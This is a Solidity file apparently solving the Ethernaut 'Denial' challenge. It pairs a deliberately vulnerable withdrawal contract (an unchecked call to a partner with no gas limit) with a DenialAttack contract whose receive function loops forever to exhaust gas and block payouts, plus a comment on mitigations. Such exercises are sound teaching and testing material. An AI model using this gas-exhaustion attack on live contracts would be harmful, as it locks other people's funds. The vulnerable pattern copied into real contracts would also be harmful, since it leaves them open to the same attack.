// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function partnerBalance() public view returns (uint) {
        return address(partner).balance;
    }

    function ownerBalance() public view returns (uint) {
        return address(owner).balance;
    }
}

/*
This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().

Typically one should follow the checks-effects-interactions (https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)
pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.

 */
contract DenialAttack {
    uint256 lower_limit;
    event Deposit(address indexed _from, uint _value, uint _gasleft);

    constructor() {
        lower_limit = 1000;
    }

    receive() external payable  {
        emit Deposit(msg.sender, msg.value, gasleft());
        simpleWhile();
    }

    function setLowerLimit(uint256 ll) public {
        lower_limit = ll;
    }

    function simpleWhile() internal pure {
        while(true) {}
    }

    function burn() internal {
        uint idx = 0;
        while (gasleft() > lower_limit) {
            idx++;
        }
        emit Deposit(msg.sender, idx, gasleft());
    }

    // https://solidity-by-example.org/sending-ether/
    // transfer needs 2300+ gas
    function burnSomeGas(uint lower_gas_limit) public payable {
        (bool sent, bytes memory data) = address(this).call{value: msg.value}("");
        if (!sent) {
            // tx failed, keep burning
            uint32 iter = 0;
            while (gasleft() > lower_gas_limit) {
                emit Deposit(msg.sender, iter, gasleft());
                assembly {
                    //allows you to store a value in storage
                    sstore(0, iter)
                }
            }
        }
    }

    function sendEth(address addr) public payable {
        (bool sent, bytes memory data) = addr.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}